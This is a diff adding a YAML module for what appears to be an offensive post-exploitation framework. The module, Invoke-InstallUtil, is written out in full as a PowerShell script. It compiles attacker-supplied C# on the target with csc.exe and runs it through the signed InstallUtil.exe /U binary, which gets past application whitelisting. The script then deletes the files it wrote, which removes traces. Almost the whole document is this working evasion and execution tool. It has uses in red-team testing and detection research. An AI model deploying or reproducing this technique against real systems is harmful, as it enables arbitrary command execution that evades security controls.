@@ -1,0 +1,115 @@
+name: Invoke-InstallUtil
+authors:
+  - name: Anthony Rose
+    handle: '@Cx01N'
+    link: https://twitter.com/Cx01N_
+description: |
+  Compile C# source dynamically via csc.exe and execute via
+  InstallUtil.exe /U for signed binary proxy execution. InstallUtil is
+  a .NET Framework utility that allows execution of code defined in
+  the Uninstall method of a class decorated with the RunInstaller
+  attribute. Adversaries abuse this to bypass application whitelisting
+  by compiling malicious C# code on the target and running it through
+  InstallUtil, which is a trusted Microsoft signed binary.
+software: ''
+tactics: [TA0005]
+techniques: [T1218.004]
+background: true
+output_extension:
+needs_admin: false
+opsec_safe: false
+language: powershell
+min_language_version: '2'
+comments:
+  - https://github.com/redcanaryco/atomic-red-team
+options:
+  - name: Command
+    description: Command to execute via the compiled assembly.
+    required: true
+    value: 'powershell.exe -nop -Command Write-Host InstallUtil_Success'
+  - name: OutputFunction
+    description: PowerShell output function to use.
+    required: false
+    value: 'Out-String'
+    suggested_values:
+      - Out-String
+      - ConvertTo-Json
+script: |
+  function Invoke-InstallUtil {
+      param(
+          [string]$Command
+      )
+
+      $TempDir = $env:TEMP
+      $SourcePath = Join-Path $TempDir "installutil_payload.cs"
+      $OutputPath = Join-Path $TempDir "installutil_payload.dll"
+      $CscPath = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
+      $InstallUtilPath = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe"
+
+      if (-not (Test-Path $CscPath)) {
+          $CscPath = "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
+          $InstallUtilPath = "C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe"
+      }
+
+      # Build the C# source from a single-quoted here-string so PowerShell
+      # does not interpolate variables or treat embedded " as delimiters.
+      # The placeholder __COMMAND__ is replaced by $Command, escaped for a
+      # C# verbatim string literal (" -> "") so any characters in the
+      # user's command survive intact.
+      $EscapedCommand = $Command.Replace('"', '""')
+      $CSharpCode = @'
+  using System;
+  using System.Diagnostics;
+  using System.ComponentModel;
+  using System.Configuration.Install;
+
+  namespace PayloadNamespace
+  {
+      [RunInstaller(true)]
+      public class PayloadClass : Installer
+      {
+          public override void Uninstall(System.Collections.IDictionary savedState)
+          {
+              base.Uninstall(savedState);
+              Process.Start("cmd.exe", @"/c __COMMAND__");
+          }
+      }
+  }
+  '@
+      $CSharpCode = $CSharpCode.Replace('__COMMAND__', $EscapedCommand)
+
+      Write-Output "[*] Writing C# source to: $SourcePath"
+      try {
+          $CSharpCode | Out-File -FilePath $SourcePath -Encoding ASCII -ErrorAction Stop
+      } catch {
+          Write-Output "[-] Failed to write C# source: $($_.Exception.Message)"
+          return
+      }
+
+      Write-Output "[*] Compiling with csc.exe..."
+      $compileArgs = @(
+          "/r:System.Configuration.Install.dll",
+          "/out:$OutputPath",
+          "/target:library",
+          $SourcePath
+      )
+      $proc = Start-Process -FilePath $CscPath -ArgumentList $compileArgs -Wait -PassThru -NoNewWindow
+      if ($proc.ExitCode -ne 0) {
+          Write-Output "[-] Compilation failed with exit code: $($proc.ExitCode)"
+          return
+      }
+
+      Write-Output "[*] Executing via InstallUtil /U..."
+      $iuProc = Start-Process -FilePath $InstallUtilPath `
+          -ArgumentList "/logfile=", "/logtoconsole=false", "/U", "`"$OutputPath`"" `
+          -Wait -PassThru -NoNewWindow
+      if ($iuProc.ExitCode -ne 0) {
+          Write-Output "[-] InstallUtil failed with exit code: $($iuProc.ExitCode)"
+      } else {
+          Write-Output "[+] InstallUtil execution completed."
+      }
+
+      Remove-Item -Path $SourcePath -Force -ErrorAction SilentlyContinue
+      Remove-Item -Path $OutputPath -Force -ErrorAction SilentlyContinue
+  }
+script_end: Invoke-InstallUtil {{ PARAMS }} | {{ OUTPUT_FUNCTION }}
